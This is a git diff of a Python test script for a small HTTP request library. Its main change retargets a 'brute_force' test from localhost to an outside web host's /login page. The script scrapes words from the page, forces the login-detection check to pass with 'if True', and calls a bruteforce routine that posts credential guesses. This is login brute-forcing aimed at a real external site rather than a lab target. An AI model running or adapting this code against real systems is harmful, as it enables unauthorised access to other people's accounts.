@@ -11,9 +11,9 @@ if __name__ == "__main__":
     # Change the value of test to change what is tested
     test = "brute_force"
     if test == "http_requests":
-        host = "facebook.com"
+        host = "httpbin.org"
         port = 80
-        url = "/"
+        url = "/get"
         ua = "chrome"
         num_get_req = 1
 
@@ -26,6 +26,8 @@ if __name__ == "__main__":
             if sent_get:
                 response = request.receive()
                 print(response)
+                body = request.get_body(response)
+                print(body)
                 tuple_ = HttpRequest.get_status_code(response)
                 status_code = tuple_[0] if tuple_ is not None else None
                 redirect_url = tuple_[1] if tuple_ is not None else None
@@ -150,24 +152,30 @@ if __name__ == "__main__":
             request.close()
 
     elif test == "brute_force":
-        host = "localhost"
-        port = 5000
+        # host = "localhost"
+        # port = 5000
+        # url = "/login"
+        # ua = "googlebot"
+
+        host = "kumo.x10host.com"
+        port = 80
         url = "/login"
-        ua = "googlebot"
+        ua = "chrome"
 
         request = HttpRequest(host, port, "GET")
         request.connect()
         sent_get = request.send_get_request(url, host, ua)
         if sent_get:
             response = request.receive()
-            print(response)
+            body = request.get_body(response)
+            print(body)
 
             # Detect if login form is present and get the login fields
             login_detected, user_key, pass_key, login_key = fetch_login_fields(response, "")
             print(f'Resp=[{login_detected}, {user_key}, {pass_key}, {login_key}]')
 
-            if login_detected:
-                words = tokenize_html(response) # Get list of words
+            if True:
+                words = tokenize_html(body) # Get list of words
                 print(words)
                 request = HttpRequest(host, port, "POST")
                 bruteforce(request, url, host, port, ua, user_key, pass_key, words)
